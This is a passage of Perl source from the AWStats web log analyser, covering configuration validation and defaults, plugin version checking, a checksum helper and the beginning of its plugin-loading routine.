$SectionsToBeSaved   = 'all'; }\n\tif ( $EnableLockForUpdate !~ /[0-1]/ ) { $EnableLockForUpdate = 0; }\n\t$DNSStaticCacheFile     ||= 'dnscache.txt';\n\t$DNSLastUpdateCacheFile ||= 'dnscachelastupdate.txt';\n\tif ( $DNSStaticCacheFile eq $DNSLastUpdateCacheFile ) {\n\t\terror(\n\"DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values.\"\n\t\t);\n\t}\n\tif ( $AllowAccessFromWebToAuthenticatedUsersOnly !~ /[0-1]/ ) {\n\t\t$AllowAccessFromWebToAuthenticatedUsersOnly = 0;\n\t}\n\tif ( $CreateDirDataIfNotExists !~ /[0-1]/ ) {\n\t\t$CreateDirDataIfNotExists = 0;\n\t}\n\tif ( $BuildReportFormat !~ /html|xhtml|xml/i ) {\n\t\t$BuildReportFormat = 'html';\n\t}\n\tif ( $BuildHistoryFormat !~ /text|xml/ ) { $BuildHistoryFormat = 'text'; }\n\tif ( $SaveDatabaseFilesWithPermissionsForEveryone !~ /[0-1]/ ) {\n\t\t$SaveDatabaseFilesWithPermissionsForEveryone = 0;\n\t}\n\tif ( $PurgeLogFile !~ /[0-1]/ ) { $PurgeLogFile = 0; }\n\tif ( $KeepBackupOfHistoricFiles !~ /[0-1]/ ) {\n\t\t$KeepBackupOfHistoricFiles = 0;\n\t}\n\t$DefaultFile[0] ||= 'index.html';\n\tif ( $AuthenticatedUsersNotCaseSensitive !~ /[0-1]/ ) {\n\t\t$AuthenticatedUsersNotCaseSensitive = 0;\n\t}\n\tif ( $URLNotCaseSensitive !~ /[0-1]/ ) { $URLNotCaseSensitive = 0; }\n\tif ( $URLWithAnchor !~ /[0-1]/ )       { $URLWithAnchor       = 0; }\n\t$URLQuerySeparators =~ s/\\s//g;\n\tif ( !$URLQuerySeparators )             { $URLQuerySeparators   = '?;'; }\n\tif ( $URLWithQuery !~ /[0-1]/ )         { $URLWithQuery         = 0; }\n\tif ( $URLReferrerWithQuery !~ /[0-1]/ ) { $URLReferrerWithQuery = 0; }\n\tif ( $WarningMessages !~ /[0-1]/ )      { $WarningMessages      = 1; }\n\tif ( $DebugMessages !~ /[0-1]/ )        { $DebugMessages        = 0; }\n\n\tif ( $NbOfLinesForCorruptedLog !~ /^\\d+/ || $NbOfLinesForCorruptedLog < 1 )\n\t{\n\t\t$NbOfLinesForCorruptedLog = 50;\n\t}\n\tif ( $Expires !~ /^\\d+/ )   { $Expires  = 0; }\n\tif ( $DecodeUA !~ /[0-1]/ ) { $DecodeUA = 0; }\n\t$MiscTrackerUrl ||= '/js/awstats_misc_tracker.js';\n\n\t# Optional accuracy setup section\n\tif ( $LevelForWormsDetection !~ /^\\d+/ )  { $LevelForWormsDetection  = 0; }\n\tif ( $LevelForRobotsDetection !~ /^\\d+/ ) { $LevelForRobotsDetection = 2; }\n\tif ( $LevelForBrowsersDetection !~ /^\\w+/ ) {\n\t\t$LevelForBrowsersDetection = 2;\n\t}    # Can be 'allphones'\n\tif ( $LevelForOSDetection !~ /^\\d+/ )    { $LevelForOSDetection    = 2; }\n\tif ( $LevelForRefererAnalyze !~ /^\\d+/ ) { $LevelForRefererAnalyze = 2; }\n\tif ( $LevelForFileTypesDetection !~ /^\\d+/ ) {\n\t\t$LevelForFileTypesDetection = 2;\n\t}\n\tif ( $LevelForSearchEnginesDetection !~ /^\\d+/ ) {\n\t\t$LevelForSearchEnginesDetection = 2;\n\t}\n\tif ( $LevelForKeywordsDetection !~ /^\\d+/ ) {\n\t\t$LevelForKeywordsDetection = 2;\n\t}\n\n\t# Optional extra setup section\n\tforeach my $extracpt ( 1 .. @ExtraName - 1 ) {\n\t\tif ( $ExtraStatTypes[$extracpt] !~ /[PHBL]/ ) {\n\t\t\t$ExtraStatTypes[$extracpt] = 'PHBL';\n\t\t}\n\t\tif (   $MaxNbOfExtra[$extracpt] !~ /^\\d+$/\n\t\t\t|| $MaxNbOfExtra[$extracpt] < 0 )\n\t\t{\n\t\t\t$MaxNbOfExtra[$extracpt] = 20;\n\t\t}\n\t\tif ( $MinHitExtra[$extracpt] !~ /^\\d+$/ || $MinHitExtra[$extracpt] < 1 )\n\t\t{\n\t\t\t$MinHitExtra[$extracpt] = 1;\n\t\t}\n\t\tif ( !$ExtraFirstColumnValues[$extracpt] ) {\n\t\t\terror(\n\"Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter\"\n\t\t\t);\n\t\t}\n\t\tif ( !$ExtraFirstColumnFormat[$extracpt] ) {\n\t\t\t$ExtraFirstColumnFormat[$extracpt] = '%s';\n\t\t}\n\t}\n\n\t# Optional appearance setup section\n\tif ( $MaxRowsInHTMLOutput !~ /^\\d+/ || $MaxRowsInHTMLOutput < 1 ) {\n\t\t$MaxRowsInHTMLOutput = 1000;\n\t}\n\tif ( $ShowMenu !~ /[01]/ )            { $ShowMenu       = 1; }\n\tif ( $ShowSummary !~ /[01UVPHB]/ )    { $ShowSummary    = 'UVPHB'; }\n\tif ( $ShowMonthStats !~ /[01UVPHB]/ ) { $ShowMonthStats = 'UVPHB'; }\n\tif ( $ShowDaysOfMonthStats !~ /[01VPHB]/ ) {\n\t\t$ShowDaysOfMonthStats = 'VPHB';\n\t}\n\tif ( $ShowDaysOfWeekStats !~ /[01PHBL]/ ) { $ShowDaysOfWeekStats = 'PHBL'; }\n\tif ( $ShowHoursStats !~ /[01PHBL]/ )      { $ShowHoursStats      = 'PHBL'; }\n\tif ( $ShowDomainsStats !~ /[01PHB]/ )     { $ShowDomainsStats    = 'PHB'; }\n\tif ( $ShowHostsStats !~ /[01PHBL]/ )      { $ShowHostsStats      = 'PHBL'; }\n\n\tif ( $ShowAuthenticatedUsers !~ /[01PHBL]/ ) {\n\t\t$ShowAuthenticatedUsers = 0;\n\t}\n\tif ( $ShowRobotsStats !~ /[01HBL]/ )     { $ShowRobotsStats     = 'HBL'; }\n\tif ( $ShowWormsStats !~ /[01HBL]/ )      { $ShowWormsStats      = 'HBL'; }\n\tif ( $ShowEMailSenders !~ /[01HBML]/ )   { $ShowEMailSenders    = 0; }\n\tif ( $ShowEMailReceivers !~ /[01HBML]/ ) { $ShowEMailReceivers  = 0; }\n\tif ( $ShowSessionsStats !~ /[01]/ )      { $ShowSessionsStats   = 1; }\n\tif ( $ShowPagesStats !~ /[01PBEX]/i )    { $ShowPagesStats      = 'PBEX'; }\n\tif ( $ShowFileTypesStats !~ /[01HBC]/ )  { $ShowFileTypesStats  = 'HB'; }\n\tif ( $ShowDownloadsStats !~ /[01HB]/ )   { $ShowDownloadsStats  = 'HB';}\n\tif ( $ShowFileSizesStats !~ /[01]/ )     { $ShowFileSizesStats  = 1; }\n\tif ( $ShowOSStats !~ /[01]/ )            { $ShowOSStats         = 1; }\n\tif ( $ShowBrowsersStats !~ /[01]/ )      { $ShowBrowsersStats   = 1; }\n\tif ( $ShowScreenSizeStats !~ /[01]/ )    { $ShowScreenSizeStats = 0; }\n\tif ( $ShowOriginStats !~ /[01PH]/ )      { $ShowOriginStats     = 'PH'; }\n\tif ( $ShowKeyphrasesStats !~ /[01]/ )    { $ShowKeyphrasesStats = 1; }\n\tif ( $ShowKeywordsStats !~ /[01]/ )      { $ShowKeywordsStats   = 1; }\n\tif ( $ShowClusterStats !~ /[01PHB]/ )    { $ShowClusterStats    = 0; }\n\tif ( $ShowMiscStats !~ /[01anjdfrqwp]/ ) { $ShowMiscStats       = 'a'; }\n\tif ( $ShowHTTPErrorsStats !~ /[01]/ )    { $ShowHTTPErrorsStats = 1; }\n\tif ( $ShowHTTPErrorsPageDetail !~ /[RH]/ ) { $ShowHTTPErrorsPageDetail = 'R'; }\n\tif ( $ShowSMTPErrorsStats !~ /[01]/ )    { $ShowSMTPErrorsStats = 0; }\n\tif ( $AddDataArrayMonthStats !~ /[01]/ ) { $AddDataArrayMonthStats = 1; }\n\n\tif ( $AddDataArrayShowDaysOfMonthStats !~ /[01]/ ) {\n\t\t$AddDataArrayShowDaysOfMonthStats = 1;\n\t}\n\tif ( $AddDataArrayShowDaysOfWeekStats !~ /[01]/ ) {\n\t\t$AddDataArrayShowDaysOfWeekStats = 1;\n\t}\n\tif ( $AddDataArrayShowHoursStats !~ /[01]/ ) {\n\t\t$AddDataArrayShowHoursStats = 1;\n\t}\n\tmy @maxnboflist = (\n\t\t'Domain',           'HostsShown',\n\t\t'LoginShown',       'RobotShown',\n\t\t'WormsShown',       'PageShown',\n\t\t'OsShown',          'BrowsersShown',\n\t\t'ScreenSizesShown', 'RefererShown',\n\t\t'KeyphrasesShown',  'KeywordsShown',\n\t\t'EMailsShown',\t\t'DownloadsShown'\n\t);\n\tmy @maxnboflistdefaultval =\n\t  ( 10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20 );\n\tforeach my $i ( 0 .. ( @maxnboflist - 1 ) ) {\n\t\tif (   !$MaxNbOf{ $maxnboflist[$i] }\n\t\t\t|| $MaxNbOf{ $maxnboflist[$i] } !~ /^\\d+$/\n\t\t\t|| $MaxNbOf{ $maxnboflist[$i] } < 1 )\n\t\t{\n\t\t\t$MaxNbOf{ $maxnboflist[$i] } = $maxnboflistdefaultval[$i];\n\t\t}\n\t}\n\tmy @minhitlist = (\n\t\t'Domain',     'Host',  'Login',     'Robot',\n\t\t'Worm',       'File',  'Os',        'Browser',\n\t\t'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',\n\t\t'EMail',\t  'Downloads'\n\t);\n\tmy @minhitlistdefaultval = ( 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );\n\tforeach my $i ( 0 .. ( @minhitlist - 1 ) ) {\n\t\tif (   !$MinHit{ $minhitlist[$i] }\n\t\t\t|| $MinHit{ $minhitlist[$i] } !~ /^\\d+$/\n\t\t\t|| $MinHit{ $minhitlist[$i] } < 1 )\n\t\t{\n\t\t\t$MinHit{ $minhitlist[$i] } = $minhitlistdefaultval[$i];\n\t\t}\n\t}\n\tif ( $FirstDayOfWeek !~ /[01]/ )   { $FirstDayOfWeek   = 1; }\n\tif ( $UseFramesWhenCGI !~ /[01]/ ) { $UseFramesWhenCGI = 1; }\n\tif ( $DetailedReportsOnNewWindows !~ /[012]/ ) {\n\t\t$DetailedReportsOnNewWindows = 1;\n\t}\n\tif ( $ShowLinksOnUrl !~ /[01]/ ) { $ShowLinksOnUrl = 1; }\n\tif ( $MaxLengthOfShownURL !~ /^\\d+/ || $MaxLengthOfShownURL < 1 ) {\n\t\t$MaxLengthOfShownURL = 64;\n\t}\n\tif ( $ShowLinksToWhoIs !~ /[01]/ ) { $ShowLinksToWhoIs = 0; }\n\t$Logo     ||= 'awstats_logo6.png';\n\t$LogoLink ||= 'http://www.awstats.org';\n\tif ( $BarWidth !~ /^\\d+/  || $BarWidth < 1 )  { $BarWidth  = 260; }\n\tif ( $BarHeight !~ /^\\d+/ || $BarHeight < 1 ) { $BarHeight = 90; }\n\t$color_Background =~ s/#//g;\n\tif ( $color_Background !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_Background = 'FFFFFF';\n\t}\n\t$color_TableBGTitle =~ s/#//g;\n\n\tif ( $color_TableBGTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableBGTitle = 'CCCCDD';\n\t}\n\t$color_TableTitle =~ s/#//g;\n\tif ( $color_TableTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableTitle = '000000';\n\t}\n\t$color_TableBG =~ s/#//g;\n\tif ( $color_TableBG !~ /^[0-9|A-H]+$/i ) { $color_TableBG = 'CCCCDD'; }\n\t$color_TableRowTitle =~ s/#//g;\n\tif ( $color_TableRowTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableRowTitle = 'FFFFFF';\n\t}\n\t$color_TableBGRowTitle =~ s/#//g;\n\tif ( $color_TableBGRowTitle !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableBGRowTitle = 'ECECEC';\n\t}\n\t$color_TableBorder =~ s/#//g;\n\tif ( $color_TableBorder !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_TableBorder = 'ECECEC';\n\t}\n\t$color_text =~ s/#//g;\n\tif ( $color_text !~ /^[0-9|A-H]+$/i ) { $color_text = '000000'; }\n\t$color_textpercent =~ s/#//g;\n\tif ( $color_textpercent !~ /^[0-9|A-H]+$/i ) {\n\t\t$color_textpercent = '606060';\n\t}\n\t$color_titletext =~ s/#//g;\n\tif ( $color_titletext !~ /^[0-9|A-H]+$/i ) { $color_titletext = '000000'; }\n\t$color_weekend =~ s/#//g;\n\tif ( $color_weekend !~ /^[0-9|A-H]+$/i ) { $color_weekend = 'EAEAEA'; }\n\t$color_link =~ s/#//g;\n\tif ( $color_link !~ /^[0-9|A-H]+$/i ) { $color_link = '0011BB'; }\n\t$color_hover =~ s/#//g;\n\tif ( $color_hover !~ /^[0-9|A-H]+$/i ) { $color_hover = '605040'; }\n\t$color_other =~ s/#//g;\n\tif ( $color_other !~ /^[0-9|A-H]+$/i ) { $color_other = '666688'; }\n\t$color_u =~ s/#//g;\n\tif ( $color_u !~ /^[0-9|A-H]+$/i ) { $color_u = 'FFA060'; }\n\t$color_v =~ s/#//g;\n\tif ( $color_v !~ /^[0-9|A-H]+$/i ) { $color_v = 'F4F090'; }\n\t$color_p =~ s/#//g;\n\tif ( $color_p !~ /^[0-9|A-H]+$/i ) { $color_p = '4477DD'; }\n\t$color_h =~ s/#//g;\n\tif ( $color_h !~ /^[0-9|A-H]+$/i ) { $color_h = '66EEFF'; }\n\t$color_k =~ s/#//g;\n\tif ( $color_k !~ /^[0-9|A-H]+$/i ) { $color_k = '2EA495'; }\n\t$color_s =~ s/#//g;\n\tif ( $color_s !~ /^[0-9|A-H]+$/i ) { $color_s = '8888DD'; }\n\t$color_e =~ s/#//g;\n\tif ( $color_e !~ /^[0-9|A-H]+$/i ) { $color_e = 'CEC2E8'; }\n\t$color_x =~ s/#//g;\n\tif ( $color_x !~ /^[0-9|A-H]+$/i ) { $color_x = 'C1B2E2'; }\n\n\t# Correct param if default value is asked\n\tif ( $ShowSummary            eq '1' ) { $ShowSummary            = 'UVPHB'; }\n\tif ( $ShowMonthStats         eq '1' ) { $ShowMonthStats         = 'UVPHB'; }\n\tif ( $ShowDaysOfMonthStats   eq '1' ) { $ShowDaysOfMonthStats   = 'VPHB'; }\n\tif ( $ShowDaysOfWeekStats    eq '1' ) { $ShowDaysOfWeekStats    = 'PHBL'; }\n\tif ( $ShowHoursStats         eq '1' ) { $ShowHoursStats         = 'PHBL'; }\n\tif ( $ShowDomainsStats       eq '1' ) { $ShowDomainsStats       = 'PHB'; }\n\tif ( $ShowHostsStats         eq '1' ) { $ShowHostsStats         = 'PHBL'; }\n\tif ( $ShowEMailSenders       eq '1' ) { $ShowEMailSenders       = 'HBML'; }\n\tif ( $ShowEMailReceivers     eq '1' ) { $ShowEMailReceivers     = 'HBML'; }\n\tif ( $ShowAuthenticatedUsers eq '1' ) { $ShowAuthenticatedUsers = 'PHBL'; }\n\tif ( $ShowRobotsStats        eq '1' ) { $ShowRobotsStats        = 'HBL'; }\n\tif ( $ShowWormsStats         eq '1' ) { $ShowWormsStats         = 'HBL'; }\n\tif ( $ShowPagesStats         eq '1' ) { $ShowPagesStats         = 'PBEX'; }\n\tif ( $ShowFileTypesStats     eq '1' ) { $ShowFileTypesStats     = 'HB'; }\n\tif ( $ShowDownloadsStats     eq '1' ) { $ShowDownloadsStats     = 'HB';}\n\tif ( $ShowOriginStats        eq '1' ) { $ShowOriginStats        = 'PH'; }\n\tif ( $ShowClusterStats       eq '1' ) { $ShowClusterStats       = 'PHB'; }\n\tif ( $ShowMiscStats eq '1' ) { $ShowMiscStats = 'anjdfrqwp'; }\n\n# Convert extra sections data into @ExtraConditionType, @ExtraConditionTypeVal...\n\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\tmy $part = 0;\n\t\tforeach my $conditioncouple (\n\t\t\tsplit( /\\s*\\|\\|\\s*/, $ExtraCondition[$extranum] ) )\n\t\t{\n\t\t\tmy ( $conditiontype, $conditiontypeval ) =\n\t\t\t  split( /[,:]/, $conditioncouple, 2 );\n\t\t\t$ExtraConditionType[$extranum][$part] = $conditiontype;\n\t\t\tif ( $conditiontypeval =~ /^REGEX\\[(.*)\\]$/i ) {\n\t\t\t\t$conditiontypeval = $1;\n\t\t\t}\n\n\t\t\t#else { $conditiontypeval=quotemeta($conditiontypeval); }\n\t\t\t$ExtraConditionTypeVal[$extranum][$part] = qr/$conditiontypeval/i;\n\t\t\t$part++;\n\t\t}\n\t\t$part = 0;\n\t\tforeach my $rowkeycouple (\n\t\t\tsplit( /\\s*\\|\\|\\s*/, $ExtraFirstColumnValues[$extranum] ) )\n\t\t{\n\t\t\tmy ( $rowkeytype, $rowkeytypeval ) =\n\t\t\t  split( /[,:]/, $rowkeycouple, 2 );\n\t\t\t$ExtraFirstColumnValuesType[$extranum][$part] = $rowkeytype;\n\t\t\tif ( $rowkeytypeval =~ /^REGEX\\[(.*)\\]$/i ) { $rowkeytypeval = $1; }\n\n\t\t\t#else { $rowkeytypeval=quotemeta($rowkeytypeval); }\n\t\t\t$ExtraFirstColumnValuesTypeVal[$extranum][$part] =\n\t\t\t  qr/$rowkeytypeval/i;\n\t\t\t$part++;\n\t\t}\n\t}\n\n\t# Show definitive value for major parameters\n\tif ($Debug) {\n\t\tdebug( \" LogFile='$LogFile'\",               2 );\n\t\tdebug( \" LogFormat='$LogFormat'\",           2 );\n\t\tdebug( \" LogSeparator='$LogSeparator'\",     2 );\n\t\tdebug( \" DNSLookup='$DNSLookup'\",           2 );\n\t\tdebug( \" DirData='$DirData'\",               2 );\n\t\tdebug( \" DirCgi='$DirCgi'\",                 2 );\n\t\tdebug( \" DirIcons='$DirIcons'\",             2 );\n\t\tdebug( \" SiteDomain='$SiteDomain'\",         2 );\n\t\tdebug( \" MiscTrackerUrl='$MiscTrackerUrl'\", 2 );\n\t\tforeach ( keys %MaxNbOf ) { debug( \" MaxNbOf{$_}=$MaxNbOf{$_}\", 2 ); }\n\t\tforeach ( keys %MinHit )  { debug( \" MinHit{$_}=$MinHit{$_}\",   2 ); }\n\n\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\tdebug(\n\t\t\t\t\" ExtraCodeFilter[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraCodeFilter[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraConditionType[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraConditionType[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraConditionTypeVal[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraFirstColumnFunction[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraFirstColumnValuesType[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t\tdebug(\n\t\t\t\t\" ExtraFirstColumnValuesTypeVal[$extranum] is array \"\n\t\t\t\t  . join( ',', @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t}\n\n# Deny URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters both set\n\tif ( @URLWithQueryWithOnly && @URLWithQueryWithout ) {\n\t\terror(\n\"URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time\"\n\t\t);\n\t}\n\n\t# Deny $ShowHTTPErrorsStats and $ShowSMTPErrorsStats both set\n\tif ( $ShowHTTPErrorsStats && $ShowSMTPErrorsStats ) {\n\t\terror(\n\"ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time\"\n\t\t);\n\t}\n\n  # Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on\n\tif ( ( $PurgeLogFile || $ArchiveLogRecords ) && $LogFile =~ /\\|\\s*$/ ) {\n\t\terror(\n\"A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0\"\n\t\t);\n\t}\n\n\t# If not a migrate, check if DirData is OK\n\tif ( !$MigrateStats && !-d $DirData ) {\n\t\tif ($CreateDirDataIfNotExists) {\n\t\t\tif ($Debug) { debug( \" Make directory $DirData\", 2 ); }\n\t\t\tmy $mkdirok = mkdir \"$DirData\", 0766;\n\t\t\tif ( !$mkdirok ) {\n\t\t\t\terror(\n\"$PROG failed to create directory DirData (DirData=\\\"$DirData\\\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists).\"\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\terror(\n\"AWStats database directory defined in config file by 'DirData' parameter ($DirData) does not exist or is not writable.\"\n\t\t\t);\n\t\t}\n\t}\n\n\tif ( $LogType eq 'S' ) { $NOTSORTEDRECORDTOLERANCE = 1000000; }\n}\n\n#------------------------------------------------------------------------------\n# Function:     Common function used by init function of plugins\n# Parameters:\tAWStats version required by plugin\n# Input:\t\t$VERSION\n# Output:\t\tNone\n# Return: \t\t'' if ok, \"Error: xxx\" if error\n#------------------------------------------------------------------------------\nsub Check_Plugin_Version {\n\tmy $PluginNeedAWStatsVersion = shift;\n\tif ( !$PluginNeedAWStatsVersion ) { return 0; }\n\t$VERSION =~ /^(\\d+)\\.(\\d+)/;\n\tmy $numAWStatsVersion = ( $1 * 1000 ) + $2;\n\t$PluginNeedAWStatsVersion =~ /^(\\d+)\\.(\\d+)/;\n\tmy $numPluginNeedAWStatsVersion = ( $1 * 1000 ) + $2;\n\tif ( $numPluginNeedAWStatsVersion > $numAWStatsVersion ) {\n\t\treturn\n\"Error: AWStats version $PluginNeedAWStatsVersion or higher is required. Detected $VERSION.\";\n\t}\n\treturn '';\n}\n\n#------------------------------------------------------------------------------\n# Function:     Return a checksum for an array of string\n# Parameters:\tArray of string\n# Input:\t\tNone\n# Output:\t\tNone\n# Return: \t\tChecksum number\n#------------------------------------------------------------------------------\nsub CheckSum {\n\tmy $string   = shift;\n\tmy $checksum = 0;\n\n\t#\tuse MD5;\n\t# \t$checksum = MD5->hexhash($string);\n\tmy $i = 0;\n\tmy $j = 0;\n\twhile ( $i < length($string) ) {\n\t\tmy $c = substr( $string, $i, 1 );\n\t\t$checksum += ( ord($c) << ( 8 * $j ) );\n\t\tif ( $j++ > 3 ) { $j = 0; }\n\t\t$i++;\n\t}\n\treturn $checksum;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Load plugins files\n# Parameters:\tNone\n# Input:\t\t$DIR @PluginsToLoad\n# Output:\t\tNone\n# Return: \t\tNone\n#------------------------------------------------------------------------------\nsub Read_Plugins {\n\n# Check plugin files in common possible directories :\n# Windows and standard package:        \t\t\"$DIR/plugins\" (plugins in same dir than awstats.pl)\n# Redhat :                                  \"/usr/local/awstats/wwwroot/cgi-bin/plugins\"\n# Debian package :                    \t\t\"/usr/share/awstats/plugins\"\n\tmy @PossiblePluginsDir = (\n\t\t\"$DIR/plugins\",\n\t\t\"/usr/local/awstats/wwwroot/cgi-bin/plugins\",\n\t\t\"/usr/share/awstats/plugins\"\n\t);\n\tmy %DirAddedInINC = ();\n\n#Removed for security reason\n#foreach my $key (keys %NoLoadPlugin) { if ($NoLoadPlugin{$key} < 0) { push @PluginsToLoad, $key; } }\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"Call to Read_Plugins with list: \" . join( ',', @PluginsToLoad ) );\n\t}\n\tforeach my $plugininfo (@PluginsToLoad) {\n\t\tmy ( $pluginfile, $pluginparam ) = split( /\\s+/, $plugininfo, 2 );\n\t\t$pluginparam ||=\n\t\t  \"\";    # If split has only on part, pluginparam is not initialized\n        $pluginfile =~ s/\\.pm$//i;\n\t\t$pluginfile =~ /([^\\/\\\\]+)$/;\n\t\t$pluginfile = Sanitize($1);     # pluginfile is cleaned from any path for security reasons and from .pm\n\t\tmy $pluginname = $pluginfile;\n\t\tif ( $NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0 ) {\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" Plugin load for '$pluginfile' has been disabled from parameters\"\n\t\t\t\t);\n\t\t\t}\n\t\t\tnext;\n\t\t}\n\t\tif ($pluginname) {\n\t\t\tif ( !$PluginsLoaded{'init'}{\"$pluginname\"} )\n\t\t\t{                   # Plugin not already loaded\n\t\t\t\tmy %pluginisfor = (\n\t\t\t\t\t'timehires'            => 'u',\n\t\t\t\t\t'ipv6'                 => 'u',\n\t\t\t\t\t'hashfiles'            => 'u',\n\t\t\t\t\t'geoipfree'            => 'u',\n\t\t\t\t\t'geoip'                => 'ou',\n\t\t\t\t\t'geoip6'               => 'ou',\n\t\t\t\t\t'geoip_region_maxmind' => 'mou',\n\t\t\t\t\t'geoip_city_maxmind'   => 'mou',\n\t\t\t\t\t'geoip_isp_maxmind'    => 'mou',\n\t\t\t\t\t'geoip_org_maxmind'    => 'mou',\n\t\t\t\t\t'timezone'             => 'ou',\n\t\t\t\t\t'decodeutfkeys'        => 'o',\n\t\t\t\t\t'hostinfo'             => 'o',\n\t\t\t\t\t'rawlog'               => 'o',\n\t\t\t\t\t'userinfo'             => 'o',\n\t\t\t\t\t'urlalias'             => 'o',\n\t\t\t\t\t'tooltips'             => 'o'\n\t\t\t\t);\n\t\t\t\tif ( $pluginisfor{$pluginname} )\n\t\t\t\t{    # If it's a known plugin, may be we don't need to load it\n\t\t\t\t\t # Do not load \"menu handler plugins\" if output only and mainleft frame\n\t\t\t\t\tif (   !$UpdateStats\n\t\t\t\t\t\t&& scalar keys %HTMLOutput\n\t\t\t\t\t\t&& $FrameName eq 'mainleft'\n\t\t\t\t\t\t&& $pluginisfor{$pluginname} !~ /m/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tnext;\n\t\t\t\t\t}\n\n\t\t\t\t\t# Do not load \"update plugins\" if output only\n\t\t\t\t\tif (   !$UpdateStats\n\t\t\t\t\t\t&& scalar keys %HTMLOutput\n\t\t\t\t\t\t&& $pluginisfor{$pluginname} !~ /o/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tnext;\n\t\t\t\t\t}\n\n\t\t\t\t\t# Do not load \"output plugins\" if update only\n\t\t\t\t\tif (   $UpdateStats\n\t\t\t\t\t\t&& !scalar keys %HTMLOutput\n\t\t\t\t\t\t&& $pluginisfor{$pluginname} !~ /u/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tnext;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t# Load plugin\n\t\t\t\tforeach my $dir (@PossiblePluginsDir) {\n\t\t\t\t\tmy $searchdir = $dir;\n\t\t\t\t\tif (   $searchdir\n\t\t\t\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t\t\t\t{\n\t\t\t\t\t\t$searchdir .= \"/\";\n\t\t\t\t\t}\n\t\t\t\t\tmy $pluginpath = \"${searchdir}${pluginfile}.pm\";\n\t\t\t\t\tif ( -s \"$pluginpath\" ) {\n\t\t\t\t\t\t$PluginDir = \"${searchdir}\";    # Set plugin dir\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\" Try to init plugin '$pluginname' ($pluginpath) with param '$pluginparam'\",\n\t\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$DirAddedInINC{\"$dir\"} ) {\n\t\t\t\t\t\t\tpush @INC, \"$dir\";\n\t\t\t\t\t\t\t$DirAddedInINC{\"$dir\"} = 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmy $loadret = 0;\n\t\t\t\t\t\tmy $modperl = $ENV{\"MOD_PERL\"}\n\t\t\t\t\t\t  ? eval {\n\t\t\t\t\t\t\trequire mod_perl;\n\t\t\t\t\t\t\t$mod_perl::VERSION >= 1.99 ? 2 : 1;\n\t\t\t\t\t\t  }\n\t\t\t\t\t\t  : 0;\n\t\t\t\t\t\tif ( $modperl == 2 ) {\n\t\t\t\t\t\t\t$loadret = require \"$pluginpath\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse { $loadret = require \"$pluginfile.pm\"; }\n\t\t\t\t\t\tif ( !$loadret || $loadret =~ /^error/i ) {\n\n\t\t\t\t\t\t\t# Load failed, we stop here\n\t\t\t\t\t\t\terror(\n\"Plugin load for plugin '$pluginname' failed with return code: $loadret\"\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmy $ret;    # To get init return\n\t\t\t\t\t\tmy $initfunction =\n\t\t\t\t\t\t  \"\\$ret=Init_$pluginname('$pluginparam')\";\t\t# Note that pluginname and pluginparam were sanitized when reading cong file entry 'LoadPlugin'\n\t\t\t\t\t\tmy $initret = eval(\"$initfunction\");\n\t\t\t\t\t\tif ( $initret && $initret eq 'xxx' ) {\n\t\t\t\t\t\t\t$initret =\n'Error: The PluginHooksFunctions variable defined in plugin file does not contain list of hooked 